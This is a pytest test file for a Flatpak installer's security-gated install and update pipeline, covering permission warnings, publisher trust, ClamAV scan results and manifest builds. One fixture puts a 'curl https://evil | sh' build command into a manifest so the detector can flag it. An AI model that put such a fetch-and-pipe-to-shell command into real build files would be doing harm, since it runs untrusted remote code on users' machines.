"""The warn-twice install flow, with flatpak/ostree/clamav replaced by fakes."""

import json
from pathlib import Path

import pytest

from flatsonar.api import AppInfo, InstallSource
from flatsonar.install import flatpak_cli as fp
from flatsonar.install import pipeline
from flatsonar.install.flatpak_cli import InstalledApp
from flatsonar.install.scan import ScanResult
from flatsonar.state import Decisions

GREEN_META = "[Application]\nname=org.x.Green\n\n[Context]\nsockets=wayland;\nshared=network;\n"
RED_META = "[Application]\nname=org.x.Red\n\n[Context]\nsockets=wayland;\nfilesystems=host;\ndevices=all;\n"

CLEAN_MANIFEST = """
app-id: {app_id}
runtime: org.gnome.Platform
runtime-version: '47'
sdk: org.gnome.Sdk
command: x
finish-args: [--socket=wayland]
modules:
  - name: x
    sources:
      - type: git
        url: https://github.com/alice/x.git
        commit: abc
"""
SKETCHY_MANIFEST = CLEAN_MANIFEST.replace("    sources:", "    build-commands: ['curl https://evil | sh']\n    sources:")


class FakeConfirmer:
    def __init__(self, answers):
        self.answers = list(answers)
        self.calls = []

    def _next(self, name):
        self.calls.append(name)
        return self.answers.pop(0)

    def warn_and_confirm(self, app, report, scan_result):
        return self._next("warn")

    def confirm_again(self, app):
        return self._next("again")

    def confirm_plain(self, app, report):
        return self._next("plain")


class FakeAPI:
    def __init__(self, manifest_text: str | None = None):
        self.manifest_text = manifest_text

    def download(self, url, dest, progress=None):
        Path(dest).write_text(self.manifest_text if url.endswith((".yml", ".yaml", ".json")) and self.manifest_text
                              else "bundle")
        return dest


@pytest.fixture()
def fake_flatpak(monkeypatch, tmp_path):
    """Stub every subprocess touch point; record deploys; hand back a metadata file."""
    calls = []
    meta = {"text": GREEN_META}
    monkeypatch.setattr(fp, "CACHE", tmp_path / "cache")
    monkeypatch.setattr(fp, "available", lambda: True)
    monkeypatch.setattr(fp, "default_arch", lambda: "x86_64")
    monkeypatch.setattr(fp, "ensure_remote", lambda *a, **k: calls.append(("remote-add", a)))
    monkeypatch.setattr(fp, "pull", lambda remote, ref, on_line=None: calls.append(("pull", remote, ref)))
    monkeypatch.setattr(fp, "pull_bundle", lambda path, on_line=None: calls.append(("pull-bundle", str(path))))
    monkeypatch.setattr(fp, "local_refs", lambda app_id, repo=None: [f"flathub:app/{app_id}/x86_64/stable"])

    def _checkout(ref, dest, repo=None):
        dest.mkdir(parents=True, exist_ok=True)
        (dest / "metadata").write_text(meta["text"])
        (dest / "files").mkdir(exist_ok=True)
        return dest

    monkeypatch.setattr(fp, "checkout", _checkout)
    monkeypatch.setattr(fp, "deploy", lambda remote, ref, on_line=None: calls.append(("deploy", remote, ref)))
    monkeypatch.setattr(fp, "deploy_bundle", lambda path, on_line=None: calls.append(("deploy-bundle", str(path))))
    monkeypatch.setattr(fp, "build_from_manifest",
                        lambda mpath, app_id, on_line=None: (calls.append(("build", app_id)), (tmp_path / "repo", f"app/{app_id}/x86_64/master"))[1])
    monkeypatch.setattr(fp, "deploy_local_build",
                        lambda repo, ref, on_line=None: calls.append(("deploy-local", ref)))
    monkeypatch.setattr(fp, "pull_update",
                        lambda app_id, installation="user", on_line=None: calls.append(("pull-update", app_id, installation)))
    monkeypatch.setattr(fp, "deploy_update",
                        lambda app_id, installation="user", on_line=None: calls.append(("deploy-update", app_id, installation)))
    monkeypatch.setattr(pipeline, "scan", lambda path: ScanResult(ran=True, scanned_files=3))
    monkeypatch.setattr(pipeline, "start_scanner", lambda: None)  # cold scan() above instead
    return calls, meta


def _app(app_id="org.x.Green", kind="flathub", perms=(), trust="verified", findings=()):
    src = {"flathub": InstallSource(kind="flathub", remote_name="flathub", ref=f"app/{app_id}/x86_64/stable"),
           "bundle": InstallSource(kind="bundle", bundle_url="https://example.com/x.flatpak"),
           "manifest": InstallSource(kind="manifest", manifest_url=f"https://raw.example/{app_id}.yml"),
           "remote": InstallSource(kind="remote", remote_name="alice", remote_url="https://alice.example/alice.flatpakrepo",
                                   ref=f"app/{app_id}/x86_64/stable")}[kind]
    return AppInfo(app_id=app_id, name=app_id.split(".")[-1], sources=[src], trust=trust,
                   trust_findings=[{"check": c, "level": l, "reason": r} for c, l, r in findings],
                   permissions=[{"arg": p, "level": "green", "reason": p} for p in perms])


def _decisions(tmp_path):
    return Decisions(tmp_path / "decisions.json")


def _installed(app_id="org.x.Green", origin="flathub", installation="user", version="1.0"):
    return InstalledApp(app_id=app_id, version=version, origin=origin, installation=installation,
                        ref=f"app/{app_id}/x86_64/stable")


def test_pick_source_prefers_flathub():
    srcs = [InstallSource(kind="manifest"), InstallSource(kind="bundle"), InstallSource(kind="flathub")]
    assert pipeline.pick_source(srcs).kind == "flathub"
    assert pipeline.pick_source([]) is None


def test_green_app_single_confirm_then_deploy(fake_flatpak, tmp_path):
    calls, _ = fake_flatpak
    conf = FakeConfirmer([True])
    out = pipeline.install(_app(), FakeAPI(), conf, _decisions(tmp_path))
    assert out.installed
    assert conf.calls == ["plain"]
    assert [c[0] for c in calls] == ["pull", "deploy"]
    assert out.report.level.label == "green"
    assert not (fp.CACHE / "scan" / "org.x.Green").exists()  # scan dir cleaned up


def test_red_app_needs_two_sures(fake_flatpak, tmp_path):
    calls, meta = fake_flatpak
    meta["text"] = RED_META
    conf = FakeConfirmer([True, True])
    out = pipeline.install(_app("org.x.Red"), FakeAPI(), conf, _decisions(tmp_path))
    assert out.installed
    assert conf.calls == ["warn", "again"]
    assert out.report.level.label == "red"
    assert any("--filesystem=host" in r for r in out.report.reasons)
    assert ("deploy", "flathub", "app/org.x.Red/x86_64/stable") in calls


def test_cancel_on_second_dialog_does_not_deploy(fake_flatpak, tmp_path):
    calls, meta = fake_flatpak
    meta["text"] = RED_META
    conf = FakeConfirmer([True, False])
    out = pipeline.install(_app("org.x.Red"), FakeAPI(), conf, _decisions(tmp_path))
    assert not out.installed and out.cancelled
    assert conf.calls == ["warn", "again"]
    assert not any(c[0].startswith("deploy") for c in calls)


def test_cancel_on_first_dialog(fake_flatpak, tmp_path):
    calls, meta = fake_flatpak
    meta["text"] = RED_META
    conf = FakeConfirmer([False])
    out = pipeline.install(_app("org.x.Red"), FakeAPI(), conf, _decisions(tmp_path))
    assert out.cancelled and conf.calls == ["warn"]


def test_accepted_warning_is_remembered_until_permissions_change(fake_flatpak, tmp_path):
    _, meta = fake_flatpak
    meta["text"] = RED_META
    decisions = _decisions(tmp_path)
    assert pipeline.install(_app("org.x.Red"), FakeAPI(), FakeConfirmer([True, True]), decisions).installed

    # Same permissions again (an update): no dialogs at all.
    conf = FakeConfirmer([])
    assert pipeline.install(_app("org.x.Red"), FakeAPI(), conf, Decisions(decisions.path)).installed
    assert conf.calls == []

    # Permissions grew: warned again.
    meta["text"] = RED_META + "\n[Session Bus Policy]\norg.freedesktop.Flatpak=talk\n"
    conf = FakeConfirmer([True, True])
    assert pipeline.install(_app("org.x.Red"), FakeAPI(), conf, Decisions(decisions.path)).installed
    assert conf.calls == ["warn", "again"]


def test_clamav_hit_escalates_green_to_red(fake_flatpak, tmp_path, monkeypatch):
    monkeypatch.setattr(pipeline, "scan",
                        lambda path: ScanResult(ran=True, infected=[("files/bin/evil", "Eicar-Test-Signature")]))
    conf = FakeConfirmer([True, True])
    out = pipeline.install(_app(), FakeAPI(), conf, _decisions(tmp_path))
    assert out.report.level.label == "red"
    assert conf.calls == ["warn", "again"]
    assert any("Eicar" in r for r in out.report.reasons)


def test_scan_skipped_is_explained_when_clamav_exists_but_nothing_was_unpacked(fake_flatpak, tmp_path, monkeypatch):
    """No ostree on the host: ClamAV is there, but there was nothing to point it at. The
    dialog must not claim ClamAV is missing."""
    monkeypatch.setattr(fp, "local_refs", lambda app_id, repo=None: [])
    monkeypatch.setattr(pipeline, "clamav_available", lambda: True)
    conf = FakeConfirmer([True])
    out = pipeline.install(_app(), FakeAPI(), conf, _decisions(tmp_path))
    assert out.installed and not out.scan.ran
    assert "ostree" in out.scan.skipped


def test_index_permissions_used_when_no_checkout(fake_flatpak, tmp_path, monkeypatch):
    monkeypatch.setattr(fp, "local_refs", lambda app_id, repo=None: [])
    conf = FakeConfirmer([True, True])
    out = pipeline.install(_app("org.x.Idx", perms=["--socket=x11"]), FakeAPI(), conf, _decisions(tmp_path))
    assert out.installed and out.report.level.label == "yellow"
    assert conf.calls == ["warn", "again"]


def test_bundle_source_flow(fake_flatpak, tmp_path):
    calls, _ = fake_flatpak
    out = pipeline.install(_app("org.x.Green", kind="bundle"), FakeAPI(), FakeConfirmer([True]), _decisions(tmp_path))
    assert out.installed
    assert [c[0] for c in calls] == ["pull-bundle", "deploy-bundle"]


def test_no_source_or_no_flatpak(fake_flatpak, tmp_path, monkeypatch):
    app = _app()
    app.sources = []
    assert "no known install source" in pipeline.install(app, FakeAPI(), FakeConfirmer([]), _decisions(tmp_path)).message
    monkeypatch.setattr(fp, "available", lambda: False)
    assert "not installed" in pipeline.install(_app(), FakeAPI(), FakeConfirmer([]), _decisions(tmp_path)).message


# --- publisher trust -----------------------------------------------------------------


def test_unverified_publisher_needs_two_sures_even_when_sandboxed(fake_flatpak, tmp_path):
    calls, _ = fake_flatpak
    conf = FakeConfirmer([True, True])
    app = _app(trust="unverified", findings=[("publisher:namespace", "yellow", "com.x claims a domain")])
    out = pipeline.install(app, FakeAPI(), conf, _decisions(tmp_path))
    assert out.installed and conf.calls == ["warn", "again"]
    assert out.report.level.label == "yellow"
    assert out.report.reasons == ["[yellow] publisher:namespace: com.x claims a domain"]
    assert [c[0] for c in calls] == ["pull", "deploy"]


def test_unverified_without_findings_still_warns(fake_flatpak, tmp_path):
    conf = FakeConfirmer([True, True])
    out = pipeline.install(_app(trust="unverified"), FakeAPI(), conf, _decisions(tmp_path))
    assert out.installed and conf.calls == ["warn", "again"]
    assert any("nobody has verified" in r for r in out.report.reasons)


def test_suspicious_publisher_is_red(fake_flatpak, tmp_path):
    conf = FakeConfirmer([True, False])
    app = _app(trust="suspicious", findings=[("publisher:namespace", "red", "claims org.mozilla")])
    out = pipeline.install(app, FakeAPI(), conf, _decisions(tmp_path))
    assert out.cancelled and out.report.level.label == "red"


def test_reviewed_flathub_app_is_single_confirm(fake_flatpak, tmp_path):
    conf = FakeConfirmer([True])
    app = _app(trust="reviewed", findings=[("publisher:flathub", "green", "on Flathub")])
    assert pipeline.install(app, FakeAPI(), conf, _decisions(tmp_path)).installed
    assert conf.calls == ["plain"]


def test_remote_source_warns_unless_verified(fake_flatpak, tmp_path):
    conf = FakeConfirmer([True, True])
    out = pipeline.install(_app(kind="remote", trust="reviewed"), FakeAPI(), conf, _decisions(tmp_path))
    assert out.installed and conf.calls == ["warn", "again"]
    assert any(r.startswith("[yellow] remote: adds the third-party Flatpak remote alice") for r in out.report.reasons)
    conf = FakeConfirmer([True])
    assert pipeline.install(_app(kind="remote", trust="verified"), FakeAPI(), conf, _decisions(tmp_path)).installed
    assert conf.calls == ["plain"]


# --- manifest builds: gate before the build ---------------------------------------------


def test_unfilled_template_manifest_is_refused_without_a_build_or_a_dialog(fake_flatpak, tmp_path):
    """Like Termix's committed manifest: the release workflow fills these in, so the
    copy in the repository can never download or verify."""
    calls, _ = fake_flatpak
    template = CLEAN_MANIFEST.format(app_id="org.x.Green").replace(
        "      - type: git\n        url: https://github.com/alice/x.git\n        commit: abc\n",
        "      - type: file\n        url: https://github.com/alice/x/releases/download/release-VERSION_PLACEHOLDER-tag/x"
        "\n        sha256: CHECKSUM_X64_PLACEHOLDER\n")
    assert "VERSION_PLACEHOLDER" in template
    conf = FakeConfirmer([])
    out = pipeline.install(_app(kind="manifest"), FakeAPI(template), conf, _decisions(tmp_path))
    assert not out.installed and not out.cancelled
    assert "VERSION_PLACEHOLDER in a source URL" in out.message
    assert conf.calls == [] and calls == []


def test_manifest_build_gated_before_flatpak_builder_runs(fake_flatpak, tmp_path):
    calls, _ = fake_flatpak
    api = FakeAPI(CLEAN_MANIFEST.format(app_id="org.x.Green"))
    # Unverified publisher, cancel at the first dialog: nothing gets built.
    conf = FakeConfirmer([False])
    out = pipeline.install(_app(kind="manifest", trust="unverified"), api, conf, _decisions(tmp_path))
    assert out.cancelled and conf.calls == ["warn"] and calls == []

    # Accept: build, then no second round because nothing new turned up.
    conf = FakeConfirmer([True, True])
    out = pipeline.install(_app(kind="manifest", trust="unverified"), api, conf, _decisions(tmp_path))
    assert out.installed and conf.calls == ["warn", "again"]
    assert [c[0] for c in calls] == ["build", "deploy-local"]


def test_manifest_audit_uses_downloaded_manifest_not_index(fake_flatpak, tmp_path):
    calls, _ = fake_flatpak
    api = FakeAPI(SKETCHY_MANIFEST.format(app_id="org.x.Green"))
    conf = FakeConfirmer([False])
    out = pipeline.install(_app(kind="manifest", trust="verified"), api, conf, _decisions(tmp_path))
    assert out.cancelled and calls == []
    assert out.report.level.label == "red"
    assert any("pipes a download" in r for r in out.report.reasons)


def test_manifest_for_other_app_id_is_red(fake_flatpak, tmp_path):
    api = FakeAPI(CLEAN_MANIFEST.format(app_id="org.evil.Other"))
    conf = FakeConfirmer([False])
    out = pipeline.install(_app(kind="manifest"), api, conf, _decisions(tmp_path))
    assert out.cancelled and any("builds org.evil.Other, not org.x.Green" in r for r in out.report.reasons)


# --- manifest builds: reuse an already-installed GNOME runtime ------------------------


def _capturing_build(seen, calls, tmp_path):
    def _build(mpath, app_id, on_line=None):
        seen["path"] = mpath
        calls.append(("build", app_id))
        return tmp_path / "repo", f"app/{app_id}/x86_64/master"

    return _build


def test_manifest_build_prefers_newer_installed_gnome_runtime(fake_flatpak, tmp_path, monkeypatch):
    calls, _ = fake_flatpak
    monkeypatch.setattr(fp, "installed_runtimes", lambda: [
        InstalledApp("org.gnome.Platform", ref="runtime/org.gnome.Platform/x86_64/46"),
        InstalledApp("org.gnome.Platform", ref="runtime/org.gnome.Platform/x86_64/48"),  # newest, out of order
    ])
    seen: dict = {}
    monkeypatch.setattr(fp, "build_from_manifest", _capturing_build(seen, calls, tmp_path))
    api = FakeAPI(CLEAN_MANIFEST.format(app_id="org.x.Green"))  # declares runtime-version 47
    out = pipeline.install(_app(kind="manifest"), api, FakeConfirmer([True]), _decisions(tmp_path))
    assert out.installed
    assert seen["path"].name == "org.x.Green.gnome48.json"
    assert json.loads(seen["path"].read_text())["runtime-version"] == "48"


def test_manifest_build_does_not_downgrade_gnome_runtime(fake_flatpak, tmp_path, monkeypatch):
    """Only the 46 branch is installed; the manifest asks for 47. Build with what the
    manifest declares (flatpak-builder pulls 47 itself) rather than downgrade."""
    calls, _ = fake_flatpak
    monkeypatch.setattr(fp, "installed_runtimes", lambda: [
        InstalledApp("org.gnome.Platform", ref="runtime/org.gnome.Platform/x86_64/46"),
    ])
    seen: dict = {}
    monkeypatch.setattr(fp, "build_from_manifest", _capturing_build(seen, calls, tmp_path))
    api = FakeAPI(CLEAN_MANIFEST.format(app_id="org.x.Green"))
    out = pipeline.install(_app(kind="manifest"), api, FakeConfirmer([True]), _decisions(tmp_path))
    assert out.installed
    assert seen["path"].name == "org.x.Green.yml"  # untouched


def test_manifest_build_ignores_non_gnome_runtime(fake_flatpak, tmp_path, monkeypatch):
    calls, _ = fake_flatpak
    monkeypatch.setattr(fp, "installed_runtimes", lambda: [
        InstalledApp("org.freedesktop.Platform", ref="runtime/org.freedesktop.Platform/x86_64/24.08"),
    ])
    seen: dict = {}
    monkeypatch.setattr(fp, "build_from_manifest", _capturing_build(seen, calls, tmp_path))
    other_runtime = CLEAN_MANIFEST.replace("runtime: org.gnome.Platform", "runtime: org.freedesktop.Platform")
    api = FakeAPI(other_runtime.format(app_id="org.x.Green"))
    out = pipeline.install(_app(kind="manifest"), api, FakeConfirmer([True]), _decisions(tmp_path))
    assert out.installed
    assert seen["path"].name == "org.x.Green.yml"  # untouched


def test_second_gate_only_when_build_adds_findings(fake_flatpak, tmp_path):
    calls, meta = fake_flatpak
    meta["text"] = RED_META  # the built app turns out to want the whole file system
    api = FakeAPI(CLEAN_MANIFEST.format(app_id="org.x.Red"))
    conf = FakeConfirmer([True, True, True, True])
    out = pipeline.install(_app("org.x.Red", kind="manifest", trust="unverified"), api, conf, _decisions(tmp_path))
    assert out.installed and conf.calls == ["warn", "again", "warn", "again"]
    assert [c[0] for c in calls] == ["build", "deploy-local"]
    reasons = out.report.reasons
    assert any("nobody has verified" in r for r in reasons) and any("--filesystem=host" in r for r in reasons)

    # Same app again: both fingerprints are remembered, no dialogs.
    conf = FakeConfirmer([])
    out = pipeline.install(_app("org.x.Red", kind="manifest", trust="unverified"), api, conf, _decisions(tmp_path))
    assert out.installed and conf.calls == []


def test_trust_report_helper():
    app = _app(trust="unverified", findings=[("publisher:new-repo", "yellow", "3 days old"),
                                            ("publisher:flathub", "green", "n/a")])
    r = pipeline.trust_report(app)
    assert r.level.label == "yellow" and len(r.findings) == 2
    assert pipeline.trust_report(_app(trust="verified")).level.label == "green"


# --- updates: gate two again, nag only about what is new -----------------------------------


def test_update_with_same_permissions_asks_nothing(fake_flatpak, tmp_path):
    calls, meta = fake_flatpak
    meta["text"] = RED_META
    decisions = _decisions(tmp_path)
    assert pipeline.install(_app("org.x.Red"), FakeAPI(), FakeConfirmer([True, True]), decisions).installed

    conf = FakeConfirmer([])
    out = pipeline.update(_app("org.x.Red"), _installed("org.x.Red"), FakeAPI(), conf, Decisions(decisions.path))
    assert out.installed and conf.calls == [] and out.message == "Red updated."
    assert [c[0] for c in calls] == ["pull", "deploy", "pull-update", "deploy-update"]
    assert ("pull-update", "org.x.Red", "user") in calls
    assert not (fp.CACHE / "scan" / "org.x.Red").exists()


def test_update_of_green_app_has_no_dialog_at_all(fake_flatpak, tmp_path):
    calls, _ = fake_flatpak
    conf = FakeConfirmer([])
    out = pipeline.update(_app(), _installed(), FakeAPI(), conf, _decisions(tmp_path))
    assert out.installed and conf.calls == []
    assert [c[0] for c in calls] == ["pull-update", "deploy-update"]


def test_update_that_grows_permissions_warns_twice(fake_flatpak, tmp_path):
    calls, meta = fake_flatpak
    decisions = _decisions(tmp_path)
    assert pipeline.install(_app(), FakeAPI(), FakeConfirmer([True]), decisions).installed  # green at install

    meta["text"] = RED_META  # the update wants the whole file system
    conf = FakeConfirmer([True, False])
    out = pipeline.update(_app(), _installed(), FakeAPI(), conf, Decisions(decisions.path))
    assert out.cancelled and conf.calls == ["warn", "again"]
    assert not any(c[0] == "deploy-update" for c in calls)
    assert any("--filesystem=host" in r for r in out.report.reasons)

    conf = FakeConfirmer([True, True])
    out = pipeline.update(_app(), _installed(), FakeAPI(), conf, Decisions(decisions.path))
    assert out.installed and conf.calls == ["warn", "again"]
    assert calls[-1] == ("deploy-update", "org.x.Green", "user")


def test_update_follows_the_installation_it_lives_in(fake_flatpak, tmp_path):
    calls, _ = fake_flatpak
    out = pipeline.update(_app(), _installed(installation="system"), FakeAPI(), FakeConfirmer([]), _decisions(tmp_path))
    assert out.installed
    assert ("pull-update", "org.x.Green", "system") in calls and ("deploy-update", "org.x.Green", "system") in calls


def test_update_of_local_build_rebuilds_from_manifest(fake_flatpak, tmp_path):
    calls, _ = fake_flatpak
    api = FakeAPI(CLEAN_MANIFEST.format(app_id="org.x.Green"))
    conf = FakeConfirmer([True])
    out = pipeline.update(_app(kind="manifest"), _installed(origin=fp.LOCAL_REMOTE), api, conf, _decisions(tmp_path))
    assert out.installed and out.message == "Green updated." and conf.calls == ["plain"]
    assert [c[0] for c in calls] == ["build", "deploy-local"]


def test_update_without_a_remote_or_manifest_fails_plainly(fake_flatpak, tmp_path):
    app = _app()
    app.sources = []
    out = pipeline.update(app, _installed(origin=""), FakeAPI(), FakeConfirmer([]), _decisions(tmp_path))
    assert not out.installed and not out.cancelled and "no manifest or bundle" in out.message


def test_update_warns_when_the_publisher_was_reassessed(fake_flatpak, tmp_path):
    decisions = _decisions(tmp_path)
    assert pipeline.install(_app(), FakeAPI(), FakeConfirmer([True]), decisions).installed
    # Since then the index found the id claims a namespace the repo does not own.
    app = _app(trust="suspicious", findings=[("publisher:namespace", "red", "claims org.mozilla")])
    conf = FakeConfirmer([False])
    out = pipeline.update(app, _installed(), FakeAPI(), conf, Decisions(decisions.path))
    assert out.cancelled and conf.calls == ["warn"] and out.report.level.label == "red"
